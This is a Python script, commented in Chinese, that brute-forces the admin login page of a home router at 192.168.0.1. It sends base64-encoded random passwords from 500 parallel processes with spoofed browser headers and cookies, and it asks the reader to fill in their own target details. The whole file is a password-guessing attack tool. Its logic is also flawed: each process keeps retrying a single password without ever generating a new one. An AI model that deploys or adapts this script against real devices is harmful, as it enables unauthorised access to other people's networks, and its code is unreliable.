# !/usr/bin/python
# encoding:utf-8
from multiprocessing import Process, Queue, Value
from datetime import datetime
import os, time
import requests
import hashlib
import random
import base64

def login(password):
    print('login ', password)
    #下面替换成您的数据
    postdata={'password': password}
    postheaders={
            'User-Agent': 'Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
            'Cookie': 'bLanguage=en; Cookie=admin:language=en; ecos_pw=admin:language=cn',
            'Referer': 'http://192.168.0.1/login.html?1',
            'Host': '192.168.0.1',
            'Origin': 'http://192.168.0.1'
            }
    r=requests.post('http://192.168.0.1/login/Auth/', data=postdata, headers=postheaders, allow_redirects=False)
    print('status_code ', r.status_code)  # 打印状态码
    return r.status_code

def loop_login(status):
    passd_length = random.randint(1, 8)
    random_raw = '1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&*()'
    passd_raw = ''.join(random.sample(random_raw, passd_length))
    password = base64.b64encode(passd_raw.encode('utf-8'))
    while status.value == 0:
        try:
            print('login-> ', passd_raw)
            if login(password) == 200:
                print(passd_raw)
                print('login success ', passd_raw)
                status.value = 1 
                break
        finally:
            pass

if __name__ == '__main__':
    status = Value('i', 0)
    for x in range(500):
        Process(target=loop_login, args=(status,)).start()
